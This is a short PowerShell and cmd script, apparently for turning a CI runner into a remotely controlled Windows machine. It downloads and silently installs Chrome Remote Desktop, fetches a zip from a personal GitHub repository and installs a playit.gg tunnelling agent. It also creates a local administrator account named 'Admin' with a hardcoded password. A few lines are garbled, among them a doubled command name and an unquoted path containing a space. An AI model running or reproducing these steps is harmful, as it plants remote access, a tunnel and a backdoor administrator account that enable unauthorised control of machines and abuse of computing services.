& {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
Invoke-WebRequest Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/zip.zip" -UseBasicParsing
unzip zip.zip
./playit-windows-x86_64.msi /Silent

cmd /c net user /add Admin P@ssw0rd.
cmd /c net localgroup /add administrators Admin

cmd /c C:\Program Files\playit_gg\playit.exe
